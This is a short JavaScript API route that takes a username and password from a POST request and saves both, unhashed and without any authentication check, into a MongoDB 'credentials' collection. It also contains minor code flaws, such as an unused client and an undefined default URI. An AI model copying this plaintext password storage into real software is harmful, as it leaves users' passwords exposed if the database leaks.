// /api/save-credentials.js
import { MongoClient } from 'mongodb';

let cachedClient = null;
const client = new MongoClient(process.env.MONGODB_URI);

async function connectToDatabase(uri = MONGODB_URI) {
  if (cachedClient) return cachedClient;
  const client = new MongoClient(uri);
  await client.connect();
  cachedClient = client;
  return client;
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { username, password } = req.body;

  if (!username || !password) return res.status(400).json({ error: 'Missing fields' });

  try {
    const client = await connectToDatabase(process.env.MONGODB_URI);
    const db = client.db('credentialsDB'); // Create a database for storing credentials
    const collection = db.collection('credentials'); // Create a collection named credentials

    await collection.insertOne({ username, password, createdAt: new Date() });
    res.status(201).json({ message: 'Credentials saved successfully' });
  } catch (error) {
    console.error('Error saving credentials:', error);
    res.status(500).json({ error: 'Database error' });
  }
}
